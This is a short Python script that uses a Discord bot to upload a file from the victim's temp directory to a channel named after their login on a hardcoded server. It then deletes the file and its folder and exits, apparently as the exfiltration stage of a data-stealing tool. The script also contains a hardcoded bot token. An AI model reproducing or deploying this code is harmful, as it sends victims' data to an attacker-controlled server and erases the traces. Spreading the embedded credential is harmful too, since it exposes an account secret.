import os
import discord
import tempfile
import shutil
import sys
token = 'MTAyMTgxOTAxNjk4MzEwNTU3Ng.GunLx_.EQ2FCywUQPRWm8FE2py90aSOSnmhnX83kCupvQ' #Bot token
client = discord.Client(intents=discord.Intents.all())
guildId = 1021689641457426503 #Discord server id
userlogin = os.getlogin().lower()
@client.event
async def on_ready():
    guild = client.get_guild(guildId)
    channelId = discord.utils.get(guild.channels, name=userlogin)
    await channelId.send(file=discord.File(f"{tempfile.gettempdir()}\\{sys.argv[1]}"))
    os.remove(f"{tempfile.gettempdir()}\\{sys.argv[1]}") 
    folder = (sys.argv[1]).split(".")[0]
    shutil.rmtree(f"{tempfile.gettempdir()}\\{folder}") 
    await client.close()
    exit()
client.run(token)